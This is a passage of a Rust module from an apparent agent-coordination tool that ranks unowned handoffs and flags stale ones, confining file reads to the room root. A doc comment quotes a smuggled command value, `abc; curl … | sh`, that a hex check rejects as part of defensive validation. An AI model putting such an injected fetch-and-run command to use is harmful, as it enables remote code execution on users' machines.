// SPDX-FileCopyrightText: 2025-2026 Tyrone Ross, Jr <46267523+tyroneross@users.noreply.github.com>
// SPDX-License-Identifier: Apache-2.0

//! The OPEN QUEUE: handoffs nobody owns, and whether each is still valid to pick up.
//!
//! # The model this module encodes
//!
//! Agents get work two ways: a handoff addressed to them BY NAME, or an item in
//! the open queue (a handoff with no target, or the `all` broadcast) that any
//! agent may take when it has nothing assigned. Open-queue items are NOT
//! assigned to the reader, so they are never ranked or worded as if they were,
//! and no age limit hides, reroutes or closes them.
//!
//! Age is still informative: on 2026-10-18, across 37 rooms, open-queue pickups
//! took p50 3.5 h, p90 7 d and up to 41.6 d, varying ~10x between rooms, and 32%
//! closed after 24 h. A fixed window would drop real pickups, so age only ever
//! asks the agent to REVALIDATE — read current state, then claim, close as done,
//! or rewrite the item — and the threshold is the room's own measured p95.
//!
//! # Revalidation signals (any one marks an item "revalidate before claiming")
//!
//! * `scope_changed_since_posted` — a file in the item's scope changed after
//!   the item was posted (recorded base hash differs, else mtime is newer).
//! * `later_fact_reports_done` — a later fact on the same thread, the same
//!   exact scope, or referencing the item says landed / shipped / done.
//! * `linked_plan_marks_done` — a plan or coordination file the item links
//!   (uri, or a path in its evidence) carries a done status line.
//! * `older_than_room_pickup_p95` — the item is older than this room's p95 time
//!   to pick up an open-queue item, recomputed from the ledger on every
//!   snapshot.
//!
//! Nothing here closes, hides or reorders anything except by rank. It is the
//! precondition check (HTTP `If-Match`, RFC 9110 §13.1.1) done as a warning.
//!
//! # Split between pure and filesystem signals
//!
//! Ledger-derived signals ([`OpenQueueSignals`]) are computed in the store
//! projection, where every fact is in hand, and ride the daemon wire in
//! `SnapshotInternals`. Filesystem signals ([`FsSignals`]) are probed by the
//! command that renders the result, bounded and confined to the room root.

use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::io::Read;
use std::path::{Path, PathBuf};

use crate::next::{HandoffAddress, handoff_address};
use crate::store::{Fact, FactKind, RoomSnapshot};

/// Most items one probe looks at, most recent first. Bounds hook cost in a
/// room with a large open queue; items past the bound simply carry no
/// filesystem reasons (fail open — they still show).
const MAX_PROBED_ITEMS: usize = 64;
const MAX_FILES_PER_ITEM: usize = 16;
const MAX_HASHED_BYTES: u64 = 4 * 1024 * 1024;
const MAX_PLAN_BYTES: u64 = 64 * 1024;
/// Later done-ish fact ids kept per item.
const MAX_DONE_REFS: usize = 3;
/// Items carried in [`OpenQueueSignals::later_done`]. It rides the daemon wire
/// under a fail-loud byte cap, and peers can post untargeted handoffs without
/// limit, so the map is bounded here (newest items kept), not at the wire.
pub(crate) const MAX_LATER_DONE_ITEMS: usize = 1_024;
/// Total bytes one probe may read across every hashed scope file and plan
/// file. `rally next --audit` runs on every prompt, so the probe has a whole-
/// call budget, not only per-item caps. Past it, remaining reads are skipped
/// (fail open: the item still shows, without that reason).
const MAX_PROBE_BYTES: u64 = 16 * 1024 * 1024;

pub(crate) const BASE_HASH_PREFIX: &str = "basehash:";
pub(crate) const BASE_COMMIT_PREFIX: &str = "base_commit:";

/// Ledger-derived open-queue signals for one room snapshot.
#[derive(Clone, Debug, Default, Deserialize, Serialize, JsonSchema, PartialEq)]
pub(crate) struct OpenQueueSignals {
    /// Closed open-queue items the p95 was computed from.
    #[serde(default)]
    pub(crate) pickup_sample: usize,
    /// The room's own nearest-rank p95 time-to-close for open-queue items,
    /// whenever it has at least one picked-up item.
    #[serde(default)]
    pub(crate) room_pickup_p95_secs: Option<i64>,
    /// Open-queue item id → later facts that report it done.
    #[serde(default)]
    pub(crate) later_done: BTreeMap<String, Vec<String>>,
    /// Open NAMED handoffs whose addressee answered with `handoff.rejected`.
    /// The rejection closes the inbox obligation and hands the work back, so
    /// `obligations::named_work` must not count it as accepted-but-open.
    /// Bounded by the open named handoffs in the room.
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    pub(crate) rejected_named: BTreeSet<String>,
}

impl OpenQueueSignals {
    /// The threshold actually applied, and how it was formed.
    pub(crate) fn effective_p95(&self) -> crate::pickup_threshold::PickupThreshold {
        crate::pickup_threshold::room_threshold(self.room_pickup_p95_secs, self.pickup_sample)
    }
}

/// One reason an open-queue item should be revalidated before anyone claims it.
#[derive(Clone, Debug, JsonSchema, Serialize, PartialEq, Eq)]
pub(crate) struct RevalidateReason {
    pub(crate) code: &'static str,
    /// The path, fact id, or threshold that triggered it.
    pub(crate) detail: String,
}

/// One open-queue item as `next` and `inbox` both see it.
#[derive(Clone, Debug, JsonSchema, Serialize)]
pub(crate) struct OpenQueueItem {
    pub(crate) event_id: String,
    pub(crate) subject: String,
    pub(crate) from: String,
    pub(crate) age_secs: i64,
    /// Always "available, unowned". Present so a consumer never has to infer
    /// ownership from a missing target.
    pub(crate) ownership: &'static str,
    pub(crate) revalidate_before_claiming: bool,
    pub(crate) reasons: Vec<RevalidateReason>,
    /// This repo's own pickup p95 (floored), or `None` when the age signal is
    /// off because the repo has too little history.
    pub(crate) pickup_p95_secs: Option<i64>,
    /// `"room"` or `"insufficient_history"`.
    pub(crate) pickup_p95_source: &'static str,
    /// Picked-up open-queue items in THIS repo the p95 came from.
    pub(crate) pickup_room_sample: usize,
}

/// Filesystem-derived reasons keyed by item id. Empty is always safe.
#[derive(Clone, Debug, Default)]
pub(crate) struct FsSignals {
    pub(crate) by_event: BTreeMap<String, Vec<RevalidateReason>>,
}

/// Is `fact` an open-queue item for `tool`?
///
/// Handoffs only, not authored by this exact tool id (an agent is not told to
/// pick up the item it just posted), no external-intake quarantine.
pub(crate) fn is_open_queue_item_for(fact: &Fact, tool: &str) -> bool {
    fact.kind == FactKind::Handoff
        && handoff_address(fact, tool) == HandoffAddress::OpenQueue
        && fact.tool.as_deref() != Some(tool)
        && !fact.scope.iter().any(|scope| scope == "external-intake")
}

/// The open queue for `tool`: every open-queue item in the snapshot, valid
/// ones first, then most recent first. Exact; callers cap for display.
pub(crate) fn open_queue_items(
    snapshot: &RoomSnapshot,
    tool: &str,
    fs: &FsSignals,
    now_secs: i64,
) -> Vec<OpenQueueItem> {
    let threshold = snapshot.open_queue_signals.effective_p95();
    let p95 = threshold.secs;
    let mut items = snapshot
        .open_handoffs
        .iter()
        .filter(|fact| is_open_queue_item_for(fact, tool))
        .map(|fact| {
            let age_secs = age_secs(fact, now_secs);
            let mut reasons = fs.by_event.get(&fact.event_id).cloned().unwrap_or_default();
            if let Some(done) = snapshot.open_queue_signals.later_done.get(&fact.event_id) {
                reasons.extend(done.iter().map(|id| RevalidateReason {
                    code: "later_fact_reports_done",
                    detail: id.clone(),
                }));
            }
            if let Some(p95) = p95
                && age_secs.is_some_and(|age| age > p95)
            {
                reasons.push(RevalidateReason {
                    code: "older_than_room_pickup_p95",
                    detail: format!("p95={p95}s source=room n={}", threshold.room_sample),
                });
            }
            (
                fact.seq,
                OpenQueueItem {
                    event_id: fact.event_id.clone(),
                    subject: fact.subject.clone(),
                    from: fact.tool.clone().unwrap_or_default(),
                    // Unparseable timestamps fail OPEN at 0: never a reason to
                    // revalidate, never a reason to hide.
                    age_secs: age_secs.unwrap_or(0),
                    ownership: "available, unowned",
                    revalidate_before_claiming: !reasons.is_empty(),
                    reasons,
                    pickup_p95_secs: p95,
                    pickup_p95_source: threshold.source,
                    pickup_room_sample: threshold.room_sample,
                },
            )
        })
        .collect::<Vec<_>>();
    items.sort_by(|(left_seq, left), (right_seq, right)| {
        left.revalidate_before_claiming
            .cmp(&right.revalidate_before_claiming)
            .then_with(|| right_seq.cmp(left_seq))
    });
    items.into_iter().map(|(_, item)| item).collect()
}

fn age_secs(fact: &Fact, now_secs: i64) -> Option<i64> {
    chrono::DateTime::parse_from_rfc3339(&fact.created_at)
        .ok()
        .map(|created| (now_secs - created.timestamp()).max(0))
}

fn epoch(raw: &str) -> Option<i64> {
    chrono::DateTime::parse_from_rfc3339(raw)
        .ok()
        .map(|time| time.timestamp())
}

// ---------------------------------------------------------------------------
// Ledger-derived signals (store projection)
// ---------------------------------------------------------------------------

/// Compute [`OpenQueueSignals`] over the projection's already-loaded facts.
///
/// Linear: one pass to index closers and done-ish facts, then a lookup per
/// handoff. Skips the done-ish index entirely when no open-queue item is open.
pub(crate) fn project_signals(facts: &[Fact], open_handoffs: &[Fact]) -> OpenQueueSignals {
    let (sample, p95) = room_pickup_p95(facts);
    let open_items = open_handoffs
        .iter()
        .filter(|fact| {
            fact.kind == FactKind::Handoff
                && handoff_address(fact, "\0") == HandoffAddress::OpenQueue
        })
        .collect::<Vec<_>>();
    let later_done = if open_items.is_empty() {
        BTreeMap::new()
    } else {
        later_done_index(facts, &open_items)
    };
    OpenQueueSignals {
        pickup_sample: sample,
        room_pickup_p95_secs: p95,
        later_done,
        rejected_named: rejected_named(facts, open_handoffs),
    }
}

/// Open named handoffs whose addressee's LATEST typed response is a rejection.
///
/// Only the newest receiver-authored `handoff.acked` / `.accepted` / `.rejected`
/// reply per handoff counts (highest seq): the bound receiver may reject and
/// then accept, and that accepted work must stay ranked. Targets are trimmed the
/// same way [`handoff_address`] trims them, so both paths agree on who the
/// addressee is.
fn rejected_named(facts: &[Fact], open_handoffs: &[Fact]) -> BTreeSet<String> {
    let targets = open_handoffs
        .iter()
        .filter(|fact| {
            fact.kind == FactKind::Handoff
                && handoff_address(fact, "\0") == HandoffAddress::Elsewhere
        })
        .filter_map(|fact| Some((fact.event_id.as_str(), fact.target.as_deref()?.trim())))
        .collect::<HashMap<_, _>>();
    if targets.is_empty() {
        return BTreeSet::new();
    }
    // ref id -> (seq, is_rejection) of the newest receiver-authored response.
    let mut latest: HashMap<&str, (i64, bool)> = HashMap::new();
    for fact in facts
        .iter()
        .filter(|fact| crate::store::handoff_is_protocol_response(fact))
    {
        let Some(ref_id) = fact.ref_id.as_deref() else {
            continue;
        };
        // Receiver-authored only: a sender or bystander cannot decline work
        // on the addressee's behalf.
        if targets.get(ref_id).copied() != fact.tool.as_deref().map(str::trim) {
            continue;
        }
        let entry = (fact.seq, crate::store::handoff_response_is_rejection(fact));
        latest
            .entry(ref_id)
            .and_modify(|seen| {
                if entry.0 > seen.0 {
                    *seen = entry;
                }
            })
            .or_insert(entry);
    }
    latest
        .into_iter()
        .filter(|(_, (_, rejected))| *rejected)
        .map(|(ref_id, _)| ref_id.to_string())
        .collect()
}

/// Nearest-rank p95 of time-to-close over CLOSED original open-queue handoffs.
///
/// "Closed" = the first later non-system resolve / receipt / artifact that
/// references it — the kinds that close a handoff in the room projection.
/// System-authored closes (reaper expiry) are not pickups and are excluded.
/// Returns `(0, None)` when the room has no picked-up item.
pub(crate) fn room_pickup_p95(facts: &[Fact]) -> (usize, Option<i64>) {
    // Original open-queue handoffs, with their sender: the sender resolving
    // its own posting is housekeeping, not a pickup, and would bias the room
    // p95 low (audit F1, 2026-10-19).
    let originals = facts
        .iter()
        .filter(|fact| {
            fact.kind == FactKind::Handoff
                && fact.ref_id.is_none()
                && handoff_address(fact, "\0") == HandoffAddress::OpenQueue
        })
        .filter_map(|fact| {
            Some((
                fact.event_id.as_str(),
                (epoch(&fact.created_at)?, fact.tool.as_deref()),
            ))
        })
        .collect::<HashMap<_, _>>();
    let mut first_close: HashMap<&str, i64> = HashMap::new();
    for fact in facts {
        if !matches!(
            fact.kind,
            FactKind::Resolve | FactKind::Receipt | FactKind::Artifact
        ) || crate::store::is_system_authored(fact)
        {
            continue;
        }
        let (Some(ref_id), Some(at)) = (fact.ref_id.as_deref(), epoch(&fact.created_at)) else {
            continue;
        };
        let Some((_, sender)) = originals.get(ref_id) else {
            continue;
        };
        if sender.is_some() && *sender == fact.tool.as_deref() {
            continue;
        }
        first_close
            .entry(ref_id)
            .and_modify(|seen| *seen = (*seen).min(at))
            .or_insert(at);
    }
    let mut durations = originals
        .iter()
        .filter_map(|(id, (opened, _))| {
            let closed = *first_close.get(id)?;
            (closed >= *opened).then_some(closed - opened)
        })
        .collect::<Vec<_>>();
    let sample = durations.len();
    if sample == 0 {
        return (0, None);
    }
    durations.sort_unstable();
    // Nearest-rank: the smallest value with at least 95% of the sample at or below it.
    let rank = (sample * 95).div_ceil(100).max(1);
    (sample, Some(durations[rank - 1]))
}

const DONE_WORDS: &[&str] = &[
    "landed",
    "shipped",
    "done",
    "merged",
    "completed",
    "complete",
    "fixed",
    "deployed",
];

/// Does this text report work as finished? Whole-word, ASCII case-insensitive.
pub(crate) fn reports_done(text: &str) -> bool {
    text.split(|c: char| !c.is_ascii_alphanumeric())
        .any(|word| {
            DONE_WORDS
                .iter()
                .any(|done| word.eq_ignore_ascii_case(done))
        })
}

/// Words that make a handoff an ASK rather than a report.
const ASK_WORDS: &[&str] = &[
    "please",
    "can",
    "could",
    "need",
    "needs",
    "todo",
    "review",
    "verify",
    "check",
    "take",
    "pick",
    "implement",
    "investigate",
    "decide",
    "fix",
    "confirm",
    "ack",
    "test",
    "build",
    "assigned",
    "owe",
    "should",
];

/// The `say handoff` write-time lint: a subject that reports finished work and
/// asks for nothing reads as a status report, which belongs in `artifact`.
///
/// Measured motivation (2026-10-18): many of the 71 open-queue items still open
/// across 37 rooms were reports ("D1/D2/D3 shipped", "LANDED", "CORRECTION:
/// reverted") that never close because nobody owes a reply. Advisory only; the
/// handoff still commits.
pub(crate) fn status_report_warning(subject: &str, summary: Option<&str>) -> Option<String> {
    let reports = reports_done(subject)
        || subject
            .split(|c: char| !c.is_ascii_alphanumeric())
            .any(|w| w.eq_ignore_ascii_case("correction") || w.eq_ignore_ascii_case("reverted"));
    if !reports {
        return None;
    }
    let text = format!("{subject} {}", summary.unwrap_or_default());
    let asks = text.contains('?')
        || text
            .split(|c: char| !c.is_ascii_alphanumeric())
            .any(|w| ASK_WORDS.iter().any(|ask| w.eq_ignore_ascii_case(ask)));
    (!asks).then(|| {
        "this handoff reads as a status report with no ask (shipped/landed/done/correction). \
         Nobody owes a reply to a report, so it would sit in the open queue unanswered. \
         Post it with `rally say artifact` instead, or add what you need from the reader."
            .to_string()
    })
}

fn shared_thread(thread_id: &str) -> bool {
    // `rally next` and read checkpoints write one thread per tool; matching on
    // those would link every wake to every item.
    thread_id.starts_with("wake-") || thread_id.starts_with("read-") || thread_id.is_empty()
}

fn linkable_scope(scope: &str) -> bool {
    scope != "external-intake" && !scope.is_empty() && scope != "backlog-item"
}

fn later_done_index(facts: &[Fact], open_items: &[&Fact]) -> BTreeMap<String, Vec<String>> {
    let wanted_threads = open_items
        .iter()
        .map(|fact| fact.thread_id.as_str())
        .filter(|thread| !shared_thread(thread))
        .collect::<BTreeSet<_>>();
    let wanted_scopes = open_items
        .iter()
        .flat_map(|fact| fact.scope.iter().map(String::as_str))
        .filter(|scope| linkable_scope(scope))
        .collect::<BTreeSet<_>>();
    let wanted_refs = open_items
        .iter()
        .map(|fact| fact.event_id.as_str())
        .collect::<BTreeSet<_>>();

    let mut by_thread: HashMap<&str, Vec<&Fact>> = HashMap::new();
    let mut by_scope: HashMap<&str, Vec<&Fact>> = HashMap::new();
    let mut by_ref: HashMap<&str, Vec<&Fact>> = HashMap::new();
    for fact in facts {
        if !matches!(
            fact.kind,
            FactKind::Artifact
                | FactKind::Decision
                | FactKind::Resolve
                | FactKind::Receipt
                | FactKind::Handoff
        ) || crate::store::is_system_authored(fact)
        {
            continue;
        }
        let touches = wanted_threads.contains(fact.thread_id.as_str())
            || fact
                .scope
                .iter()
                .any(|s| wanted_scopes.contains(s.as_str()))
            || fact
                .ref_id
                .as_deref()
                .is_some_and(|r| wanted_refs.contains(r));
        if !touches
            || !(reports_done(&fact.subject) || fact.summary.as_deref().is_some_and(reports_done))
        {
            continue;
        }
        by_thread
            .entry(fact.thread_id.as_str())
            .or_default()
            .push(fact);
        for scope in &fact.scope {
            if wanted_scopes.contains(scope.as_str()) {
                by_scope.entry(scope.as_str()).or_default().push(fact);
            }
        }
        if let Some(r) = fact.ref_id.as_deref() {
            by_ref.entry(r).or_default().push(fact);
        }
    }

    let mut out = BTreeMap::new();
    for item in open_items.iter().rev() {
        if out.len() >= MAX_LATER_DONE_ITEMS {
            break;
        }
        let mut hits = Vec::<&Fact>::new();
        if !shared_thread(&item.thread_id)
            && let Some(list) = by_thread.get(item.thread_id.as_str())
        {
            hits.extend(list.iter().copied());
        }
        for scope in item.scope.iter().filter(|s| linkable_scope(s)) {
            if let Some(list) = by_scope.get(scope.as_str()) {
                hits.extend(list.iter().copied());
            }
        }
        if let Some(list) = by_ref.get(item.event_id.as_str()) {
            hits.extend(list.iter().copied());
        }
        let mut ids = hits
            .into_iter()
            .filter(|fact| fact.seq > item.seq && fact.event_id != item.event_id)
            .map(|fact| (fact.seq, fact.event_id.clone()))
            .collect::<Vec<_>>();
        ids.sort();
        ids.dedup();
        if !ids.is_empty() {
            out.insert(
                item.event_id.clone(),
                ids.into_iter()
                    .take(MAX_DONE_REFS)
                    .map(|(_, id)| id)
                    .collect(),
            );
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Filesystem signals (command layer)
// ---------------------------------------------------------------------------

/// Probe the filesystem for every open-queue item `tool` would see.
///
/// Read-only and bounded: at most [`MAX_PROBED_ITEMS`] items, [`MAX_FILES_PER_ITEM`]
/// files each, regular files only, every path canonicalized and required to sit
/// under the room root (a peer-authored path cannot make rally read outside the
/// room, or block on a FIFO or device). Any error just omits that reason.
pub(crate) fn probe_fs(snapshot: &RoomSnapshot, tool: &str, root: &Path) -> FsSignals {
    let Ok(root) = root.canonicalize() else {
        return FsSignals::default();
    };
    let mut items = snapshot
        .open_handoffs
        .iter()
        .filter(|fact| is_open_queue_item_for(fact, tool))
        .collect::<Vec<_>>();
    items.sort_by_key(|fact| std::cmp::Reverse(fact.seq));
    let mut by_event = BTreeMap::new();
    let mut budget = MAX_PROBE_BYTES;
    for fact in items.into_iter().take(MAX_PROBED_ITEMS) {
        let mut reasons = Vec::new();
        reasons.extend(scope_changes(fact, &root, &mut budget));
        reasons.extend(linked_plan_done(fact, &root, &mut budget));
        if !reasons.is_empty() {
            by_event.insert(fact.event_id.clone(), reasons);
        }
    }
    FsSignals { by_event }
}

/// Resolve a fact-supplied path under `root`, or `None` if it escapes the room,
/// does not exist, or is not a regular file.
pub(crate) fn confined_file(root: &Path, raw: &str) -> Option<PathBuf> {
    let raw = raw.strip_prefix("file:").unwrap_or(raw).trim();
    if raw.is_empty() || raw.contains('\0') {
        return None;
    }
    let candidate = if Path::new(raw).is_absolute() {
        PathBuf::from(raw)
    } else {
        root.join(raw)
    };
    let resolved = candidate.canonicalize().ok()?;
    let inside = resolved.strip_prefix(root).ok()?;
    // Rally's own room state and git internals are never a handoff's scope or
    // plan; refusing them keeps a peer from probing their contents (SEC-003).
    if inside
        .components()
        .next()
        .is_some_and(|first| matches!(first.as_os_str().to_str(), Some(".rally" | ".git")))
    {
        return None;
    }
    let meta = std::fs::metadata(&resolved).ok()?;
    meta.is_file().then_some(resolved)
}

/// Read at most `max` bytes of a REGULAR file, deciding on the open handle.
///
/// `O_NONBLOCK | O_NOFOLLOW` plus `fstat` on the handle close the window
/// between [`confined_file`]'s check and the read (SEC-003): a FIFO swapped in
/// cannot block the hook, a symlink swapped in is refused, and the length is
/// the handle's. Returns `(bytes, truncated)`.
fn read_regular(path: &Path, max: u64) -> Option<(Vec<u8>, bool)> {
    use std::os::unix::fs::OpenOptionsExt;
    let file = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NONBLOCK | libc::O_NOFOLLOW)
        .open(path)
        .ok()?;
    let meta = file.metadata().ok()?;
    if !meta.is_file() {
        return None;
    }
    let mut buf = Vec::new();
    file.take(max.saturating_add(1))
        .read_to_end(&mut buf)
        .ok()?;
    let truncated = buf.len() as u64 > max;
    buf.truncate(usize::try_from(max).unwrap_or(usize::MAX));
    Some((buf, truncated))
}

/// FNV-1a 64 of a regular file, refusing anything over [`MAX_HASHED_BYTES`].
/// Same hash as `source_grounding` so `claimhash:` and `basehash:` agree.
pub(crate) fn bounded_hash(path: &Path) -> Option<String> {
    let (bytes, truncated) = read_regular(path, MAX_HASHED_BYTES)?;
    (!truncated).then(|| crate::source_grounding::hash_bytes(&bytes))
}

/// Split Rally's base markers into the ones that fit the ledger's evidence
/// bounds and a count of the ones that do not: too long for one item, or past
/// the free slots. Every dropped marker is reported (`handoff:base_not_recorded`).
pub(crate) fn fit_base_markers(
    markers: Vec<String>,
    room_free: usize,
    max_item_len: usize,
) -> (Vec<String>, usize) {
    let (fits, oversize): (Vec<_>, Vec<_>) = markers
        .into_iter()
        .partition(|marker| marker.len() <= max_item_len);
    let dropped = oversize.len() + fits.len().saturating_sub(room_free);
    (fits.into_iter().take(room_free).collect(), dropped)
}

/// `basehash:<rel>=<hash>` markers from a handoff's evidence.
pub(crate) fn base_hashes(evidence: &[String]) -> BTreeMap<String, String> {
    evidence
        .iter()
        .filter_map(|entry| entry.strip_prefix(BASE_HASH_PREFIX))
        .filter_map(|rest| rest.split_once('='))
        .map(|(path, hash)| (path.to_string(), hash.to_string()))
        .collect()
}

/// The handoff's recorded base commit, if it is a well-formed object id.
///
/// The LAST marker wins, matching [`base_hashes`] (Rally appends its own
/// markers after any caller evidence), and the value must be 7-64 hex digits.
/// It is interpolated into a suggested `git diff` command, so anything else —
/// `abc; curl … | sh` from a hand-written or imported row — is dropped rather
/// than rendered.
pub(crate) fn base_commit(evidence: &[String]) -> Option<&str> {
    evidence
        .iter()
        .rev()
        .find_map(|entry| entry.strip_prefix(BASE_COMMIT_PREFIX))
        .map(str::trim)
        .filter(|sha| (7..=64).contains(&sha.len()) && sha.chars().all(|c| c.is_ascii_hexdigit()))
}

/// Is this caller-supplied evidence entry one of the base markers Rally writes?
/// `say handoff` refuses them, like `ack-by:`, so the recorded base is always
/// Rally's own observation.
pub(crate) fn is_reserved_base_marker(entry: &str) -> bool {
    entry.starts_with(BASE_HASH_PREFIX) || entry.starts_with(BASE_COMMIT_PREFIX)
}

/// Record the base an overwrite guard compares against: the room's git HEAD
/// and a content hash per file in scope. Bounded and confined like the probe.
pub(crate) fn base_markers(root: &Path, scope: &[String]) -> Vec<String> {
    let Ok(root) = root.canonicalize() else {
        return Vec::new();
    };
    let mut markers = Vec::new();
    if let Some(sha) = git_head(&root) {
        markers.push(format!("{BASE_COMMIT_PREFIX}{sha}"));
    }
    for raw in scope
        .iter()
        .filter(|scope| scope.starts_with("file:"))
        .take(MAX_FILES_PER_ITEM)
    {
        let rel = raw.strip_prefix("file:").unwrap_or(raw);
        if let Some(path) = confined_file(&root, rel)
            && let Some(hash) = bounded_hash(&path)
        {
            markers.push(format!("{BASE_HASH_PREFIX}{rel}={hash}"));
        }
    }
    markers
}

fn git_head(root: &Path) -> Option<String> {
    let output = std::process::Command::new("git")
        .arg("-C")
        .arg(root)
        .args(["rev-parse", "--verify", "-q", "HEAD"])
        .stdin(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let sha = String::from_utf8(output.stdout).ok()?.trim().to_string();
    (sha.len() >= 7 && sha.chars().all(|c| c.is_ascii_hexdigit())).then_some(sha)
}

/// Charge `len` bytes to the probe budget; `false` once it is spent.
fn spend(budget: &mut u64, path: &Path, cap: u64) -> bool {
    let len = std::fs::metadata(path)
        .map(|m| m.len().min(cap))
        .unwrap_or(cap);
    if len > *budget {
        return false;
    }
    *budget -= len;
    true
}

fn scope_changes(fact: &Fact, root: &Path, budget: &mut u64) -> Vec<RevalidateReason> {
    let recorded = base_hashes(&fact.evidence);
    let posted = epoch(&fact.created_at);
    let mut out = Vec::new();
    for raw in fact
        .scope
        .iter()
        .filter(|scope| scope.starts_with("file:"))
        .take(MAX_FILES_PER_ITEM)
    {
        let rel = raw.strip_prefix("file:").unwrap_or(raw);
        let Some(path) = confined_file(root, rel) else {
            continue;
        };
        let changed = match recorded.get(rel) {
            // A recorded base is authoritative: compare content.
            Some(base) => {
                spend(budget, &path, MAX_HASHED_BYTES)
                    && bounded_hash(&path).is_some_and(|now| &now != base)
            }
            // Legacy item without a base: fall back to mtime after posting.
            None => posted.is_some_and(|posted| mtime_secs(&path).is_some_and(|m| m > posted)),
        };
        if changed {
            out.push(RevalidateReason {
                code: "scope_changed_since_posted",
                detail: rel.to_string(),
            });
        }
    }
    out
}

fn mtime_secs(path: &Path) -> Option<i64> {
    let modified = std::fs::metadata(path).ok()?.modified().ok()?;
    let secs = modified
        .duration_since(std::time::UNIX_EPOCH)
        .ok()?
        .as_secs();
    i64::try_from(secs).ok()
}

/// Paths an item links as its plan or coordination file: `uri` (non-URL), plain
/// path-shaped evidence entries, and path-valued keys inside JSON evidence
/// (the coordination bootstrap writes `coord_file` / `integration_checkpoint`).
fn linked_paths(fact: &Fact) -> Vec<String> {
    const KEYS: &[&str] = &[
        "coord_file",
        "integration_checkpoint",
        "plan",
        "plan_file",
        "uri",
        "path",
    ];
    let mut out = Vec::new();
    if let Some(uri) = fact.uri.as_deref()
        && !uri.contains("://")
    {
        out.push(uri.to_string());
    }
    for entry in &fact.evidence {
        let entry = entry.trim();
        if entry.starts_with('{') {
            if let Ok(serde_json::Value::Object(map)) = serde_json::from_str(entry) {
                for key in KEYS {
                    if let Some(serde_json::Value::String(value)) = map.get(*key) {
                        out.push(value.clone());
                    }
                }
            }
        } else if !entry.contains(char::is_whitespace)
            && [".md", ".json", ".txt", ".yaml", ".yml"]
                .iter()
                .any(|ext| entry.ends_with(ext))
        {
            out.push(entry.to_string());
        }
    }
    out.sort();
    out.dedup();
    out.truncate(MAX_FILES_PER_ITEM);
    out
}

fn linked_plan_done(fact: &Fact, root: &Path, budget: &mut u64) -> Vec<RevalidateReason> {
    linked_paths(fact)
        .into_iter()
        .filter_map(|raw| {
            let path = confined_file(root, &raw)?;
            if !spend(budget, &path, MAX_PLAN_BYTES) {
                return None;
            }
            plan_marks_done(&path).then_some(RevalidateReason {
                code: "linked_plan_marks_done",
                detail: raw,
            })
        })
        .collect()
}

/// Does a plan/coordination file carry a done status line?
///
/// Reads at most [`MAX_PLAN_BYTES`]. A line counts when, after stripping
/// markdown emphasis and list/table punctuation, it starts with `status`,
/// `state` or `result` and contains a done word. Advisory: a false positive
/// costs the agent one read, which is why a heuristic is acceptable here.
pub(crate) fn plan_marks_done(path: &Path) -> bool {
    let Some((buf, _)) = read_regular(path, MAX_PLAN_BYTES) else {
        return false;
    };
    String::from_utf8_lossy(&buf).lines().any(|line| {
        let cleaned = line
            .trim_start_matches(|c: char| {
                c.is_whitespace() || matches!(c, '*' | '#' | '-' | '|' | '>' | '_')
            })
            .replace('*', "");
        let lower = cleaned.to_ascii_lowercase();
        ["status", "state", "result"].iter().any(|key| {
            lower
                .strip_prefix(key)
                .is_some_and(|rest| rest.trim_start().starts_with(':'))
        }) && reports_done(&cleaned)
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn handoff(id: &str, seq: i64, target: Option<&str>, created_at: &str) -> Fact {
        Fact {
            schema: crate::FACT_SCHEMA.to_string(),
            event_id: id.to_string(),
            seq,
            thread_id: format!("room_{id}"),
            kind: FactKind::Handoff,
            tool: Some("claude_code".to_string()),
            subject: format!("handoff {id}"),
            created_at: created_at.to_string(),
            target: target.map(str::to_string),
            ..Fact::default()
        }
    }

    fn closer(id: &str, seq: i64, ref_id: &str, created_at: &str) -> Fact {
        Fact {
            schema: crate::FACT_SCHEMA.to_string(),
            event_id: id.to_string(),
            seq,
            thread_id: format!("room_{id}"),
            kind: FactKind::Resolve,
            tool: Some("codex".to_string()),
            subject: "picked up".to_string(),
            created_at: created_at.to_string(),
            ref_id: Some(ref_id.to_string()),
            ..Fact::default()
        }
    }

    fn at(hours: i64) -> String {
        (chrono::DateTime::parse_from_rfc3339("2026-01-01T00:00:00Z").unwrap()
            + chrono::Duration::hours(hours))
        .to_rfc3339()
    }

    #[test]
    fn room_p95_is_nearest_rank_at_any_sample_size() {
        assert_eq!(room_pickup_p95(&[]), (0, None));
        let mut facts = Vec::new();
        for i in 0..19_i64 {
            facts.push(handoff(&format!("h{i}"), i * 2 + 1, None, &at(0)));
            facts.push(closer(
                &format!("c{i}"),
                i * 2 + 2,
                &format!("h{i}"),
                &at(i + 1),
            ));
        }
        // Durations 1..=19 h; nearest-rank p95 of 19 = the 19th value.
        assert_eq!(room_pickup_p95(&facts), (19, Some(19 * 3600)));
        facts.push(handoff("h19", 1000, None, &at(0)));
        facts.push(closer("last", 1001, "h19", &at(20)));
        // Durations 1..=20 h; nearest-rank p95 of 20 = the 19th value.
        assert_eq!(room_pickup_p95(&facts), (20, Some(19 * 3600)));
    }

    /// Audit F1: the sender resolving its own posting is not a pickup.
    #[test]
    fn a_sender_closing_its_own_posting_is_not_a_pickup() {
        let mut facts = Vec::new();
        for i in 0..3_i64 {
            facts.push(handoff(&format!("h{i}"), i * 2 + 1, None, &at(0)));
            let mut own = closer(&format!("c{i}"), i * 2 + 2, &format!("h{i}"), &at(1));
            own.tool = Some("claude_code".to_string()); // same as handoff() sender
            facts.push(own);
        }
        assert_eq!(room_pickup_p95(&facts), (0, None));
        facts.push(closer("peer", 100, "h0", &at(5)));
        assert_eq!(room_pickup_p95(&facts), (1, Some(5 * 3600)));
    }

    /// Below the minimum sample the AGE signal is off, but every other
    /// revalidation signal still fires; at the minimum the repo's own p95
    /// applies.
    #[test]
    fn age_signal_needs_history_but_other_signals_do_not() {
        let mut snapshot = RoomSnapshot::default();
        snapshot
            .open_handoffs
            .push(handoff("ancient", 1, None, "2000-01-01T00:00:00Z"));
        snapshot
            .open_queue_signals
            .later_done
            .insert("ancient".to_string(), vec!["landed-1".to_string()]);
        snapshot.open_queue_signals.room_pickup_p95_secs = Some(3 * 3600);
